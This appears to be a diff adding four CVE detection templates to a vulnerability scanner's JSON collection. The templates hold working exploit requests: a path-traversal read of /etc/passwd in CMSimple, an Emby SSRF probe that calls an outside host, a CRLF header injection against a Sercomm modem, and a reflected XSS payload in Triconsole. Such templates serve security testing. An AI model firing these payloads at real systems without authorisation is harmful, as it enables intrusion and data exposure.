@@ -75,6 +75,39 @@
       ]
     },
     {
+      "id": "CVE-2008-2650",
+      "info": {
+        "author": "pussycat0x",
+        "name": "CMSimple 3.1 - Local File Inclusion",
+        "reference": "https://www.exploit-db.com/exploits/5700",
+        "severity": "high",
+        "tags": "cve,cve2008,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /index.php?sl=../../../../../../../etc/passwd%00 HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-2861",
       "info": {
         "author": "pikpikcu",
@@ -6015,6 +6048,48 @@
       ]
     },
     {
+      "id": "CVE-2020-26948",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Emby Server before 4.5.0 allows SSRF via the Items/RemoteSearch/Image ImageURL parameter.",
+        "name": "Emby Server SSRF",
+        "reference": "https://github.com/btnz-k/emby_ssrf",
+        "severity": "critical",
+        "tags": "cve,cve2020,emby,jellyfin,ssrf"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Name or service not known"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/plain"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-27982",
       "info": {
         "author": "madrobot",
@@ -7731,6 +7806,86 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ics?tool=search&query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27132",
+      "info": {
+        "author": "geeknik",
+        "description": "Sercomm AGCOMBO VD625 Smart Modems with firmware version AGSOT_2.1.0 are vulnerable to CRLF Injection via the Content-Disposition header - https://cybertuz.com/blog/post/crlf-injection-CVE-2021-27132",
+        "name": "CRLF Injection - Sercomm VD625",
+        "severity": "medium",
+        "tags": "cve,cve2021,crlf"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "status": [
+                404
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Disposition: attachment;filename=test.txt",
+                "Set-Cookie:CRLFInjection=Test",
+                "Location: example.com",
+                "X-XSS-Protection:0"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-27330",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Triconsole 3.75 XSS",
+        "reference": "https://www.exploit-db.com/exploits/49597",
+        "severity": "medium",
+        "tags": "cve,cve2021,triconsole,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/calendar_form.php/\"><script>alert(document.domain)</script>"
           ]
         }
       ]
